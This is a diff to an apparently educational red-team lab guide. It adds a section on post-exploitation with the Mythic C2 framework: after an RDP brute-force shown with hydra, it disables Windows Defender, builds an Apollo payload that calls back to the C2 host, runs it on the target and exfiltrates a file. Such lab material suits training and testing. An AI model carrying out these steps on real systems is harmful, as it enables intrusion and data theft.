@@ -445,7 +445,66 @@ hydra -L users.txt -P passwords.txt rdp://192.168.1.20
 
 ---
 
-### Data Exfiltration Attack
+### Data Exfiltration and C2 with Mythic
+
+This section demonstrates a realistic exfiltration workflow using Kali Linux and the Mythic C2 framework after a successful RDP attack. Follow these summarized steps (≤60 lines):
+
+#### 1. RDP Access and Payload Preparation
+- After brute-forcing RDP credentials, use Kali Linux to connect to the Windows target via RDP.
+- Disable Windows Defender and firewall on the target to avoid detection/interference from C2 operations.
+
+#### 2. Setting Up Mythic C2 Server
+- SSH into your Ubuntu VM designated as the Mythic server.
+- Prepare your system:
+  ```bash
+  sudo apt update && sudo apt upgrade -y
+  sudo apt install docker.io -y
+  sudo systemctl start docker
+  sudo systemctl enable docker
+  sudo systemctl status docker  # Confirm Docker is running
+  ```
+- Clone Mythic from GitHub and install:
+  ```bash
+  git clone https://github.com/its-a-feature/Mythic
+  cd Mythic
+  ./install_docker_ubuntu.sh
+  make
+  ```
+- Ensure your firewall allows inbound connections to the Mythic server from your attacker's IP (allow all traffic for testing, but restrict in real deployments).
+
+#### 3. Mythic Configuration and Dashboard
+- Launch Mythic CLI:
+  ```bash
+  ./mythic-cli
+  ```
+- Access the Mythic dashboard in your browser (default: `http://<mythic-server-ip>:7443`).
+
+#### 4. Deploying Agents and Profiles
+- Use Mythic CLI or dashboard to pull the Apollo agent and the http C2 profile:
+  ```bash
+  ./mythic-cli install github https://github.com/MythicAgents/Apollo
+  ./mythic-cli install github https://github.com/MythicC2Profiles/http
+  ```
+- Ensure both "Apollo" agent and "http" profile are visible in the dashboard.
+
+#### 5. Payload Creation
+- In the Mythic dashboard, click the hazardous (biohazard) icon to create a new payload.
+- Select:
+  - Payload type: Apollo (Windows, exe)
+  - C2 profile: http
+  - Callback Host: set to your Mythic server's public IP
+  - Allow all commands for testing
+- Generate the payload. Download the resulting `.exe` file.
+
+#### 6. Payload Deployment & Data Exfiltration
+- Using the RDP session from Kali, transfer the payload `.exe` to the Windows desktop (example: create a fake file for exfil, e.g., `passwords.txt`).
+- Execute the payload to establish a callback from the Windows target to Mythic C2.
+- In the Mythic dashboard, confirm you see an active callback from the Windows host.
+- Use Mythic CLI/dashboard to run commands for data exfiltration, e.g., download `passwords.txt` from the Windows desktop.
+
+#### 7. Cleanup & Security Notes
+- After testing, remove exfiltrated files and revert firewall/Defender settings.
+- Always use isolated, test environments—**never run this on production or unauthorized systems**.
 
 ---
 
